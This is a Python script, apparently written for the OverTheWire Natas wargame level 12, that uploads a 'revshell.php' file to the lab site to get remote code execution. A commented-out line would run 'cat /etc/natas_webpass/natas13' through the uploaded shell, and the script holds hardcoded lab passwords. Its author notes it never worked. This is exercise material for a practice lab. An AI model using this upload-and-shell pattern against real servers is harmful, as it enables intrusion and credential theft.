#!/usr/bin/env python
# File Upload Remote Code Execution

#FIXME: couldnt get to work at all

# import the package requests which is for html information
import os
import requests
import re


username = 'natas12'
password = 'YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG'

url = 'http://%s.natas.labs.overthewire.org/' % username

# get the absolute file path of the 'revshell.php' file
file_path = os.path.abspath('revshell.php')


# blank temp response = requests.get(url,auth = (username, password))
session = requests.Session()
# response = session.get(url,auth = (username, password))
#with open("revshell.php", "rb") as f:
#    files = {"uploadedfile": f}
#    data = {"filename": "revshell.php", "MAX_FILE_SIZE": "1000"}
#    auth = (username, password)
#    response = requests.post(url, files=files, data=data, auth=auth)

response = session.post(url,files = { "uploadedfile" : open ('revshell.php', 'rb') },data = {"filename" : "revshell.php", "MAX_FILE_SIZE" : "1000"},auth = (username, password))

# response = session.get( url+ 'upload/8x1qt4bci1.php?c=cat /etc/natas_webpass/natas13', auth = (username, password))

content = response.text
print(content)
# (.*)

# print(re.findall("The password for natas12 is (.*)<br>", content)[0])


# natas 12 lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
